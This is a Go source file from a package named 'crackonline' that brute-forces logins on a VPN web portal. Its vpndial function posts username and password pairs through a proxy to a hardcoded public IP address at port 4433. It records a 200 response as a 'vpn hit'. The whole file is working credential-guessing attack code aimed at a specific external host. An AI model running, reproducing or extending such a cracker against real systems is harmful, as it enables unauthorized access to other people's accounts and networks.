package crackonline

import (
	"github.com/rock-go/rock/logger"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func (o *online) vpndial(ipstopf *bool, userstopf *bool, s *int, ip string, port int, user string, pass string) {
	proxy := o.cfg.proxy
	status := 404
	u, e := url.Parse(proxy)
	if e != nil {
		//println("vpn proxy error:" , e.Error())
		logger.Errorf("vpn proxy error: %s", e.Error())
		*userstopf = true
		*ipstopf = true
		*s += 1
		return
	}
	c := http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(u),
		},
		Timeout: 5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, e := c.Post(
		"https://180.169.109.130:4433/loginok.html",
		"application/x-www-form-urlencoded",
		strings.NewReader("txtUserName="+user+"&txtPasswd="+pass+"&session=12345&Image2="))
	if e != nil {
		//println(e.Error())
		logger.Errorf("vpn post error,please check the proxy addr %s", e.Error())
		*userstopf = true
		*ipstopf = true
		*s += 1
		return
	}
	status = resp.StatusCode
	if status == 200 {
		*userstopf = true
		o.ev("", user, pass, 0, "vpn hit")
	} else {
		//println("fail")
	}
	*s += 1
}
